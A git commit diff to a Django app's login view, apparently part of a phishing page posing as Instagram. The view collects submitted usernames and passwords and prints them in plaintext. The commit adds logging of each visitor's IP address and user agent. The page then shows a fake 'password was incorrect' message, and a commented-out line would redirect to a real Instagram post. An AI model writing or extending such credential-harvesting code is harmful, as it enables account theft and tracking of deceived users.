cbbb57e499c2ff47de6f9b59b4b3303d99def3a8
aahadrahi <aahadrahi786@gmail.com>
2024-01-13 17:26:14 +0530

    ip

--- myapp/views.py
+++ myapp/views.py
@@ -8,14 +8,21 @@ def index(request):
     return render(request, 'myapp/index.html', {'message': 'Hello, this is your app\'s index page.'})
 def login_view(request):
     success_message = None
+    user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown User Agent')
+    device_info = f'Device Info: {user_agent}'
 
+    # Capture user's IP address
+    user_ip = request.META.get('REMOTE_ADDR', 'Unknown IP')
     if request.method == 'POST':
         username = request.POST.get('username')
         password = request.POST.get('password')
 
         # Save form data to the database
         user_data = {'username': username, 'password': password}
-        print(user_data)
+        user_data = {'username': username, 'password': password}
+        print(f'User Data: {user_data}')
+        print(device_info)
+        print(f'User IP: {user_ip}')
         success_message = 'Sorry, your password was incorrect. Please double-check your password.'
         messages.success(request, success_message)
         # return redirect('https://www.instagram.com/p/C1-Bhj2v0T-/')
